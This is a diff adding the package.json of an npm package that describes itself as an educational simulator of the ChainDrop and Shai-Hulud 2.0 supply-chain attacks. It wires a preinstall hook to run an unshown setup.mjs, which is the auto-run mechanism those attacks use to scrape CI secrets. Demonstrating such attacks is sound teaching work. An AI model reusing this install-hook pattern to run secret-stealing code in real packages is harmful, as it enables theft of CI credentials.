@@ -1,0 +1,9 @@
+{
+  "name": "chaindrop-shai-hulud-simulator",
+  "version": "1.0.0",
+  "description": "Safe educational simulator of how ChainDrop (Aug 2026) and Shai-Hulud 2.0 abuse npm preinstall hooks to scrape CI runner secrets",
+  "private": true,
+  "scripts": {
+    "preinstall": "node setup.mjs"
+  }
+}
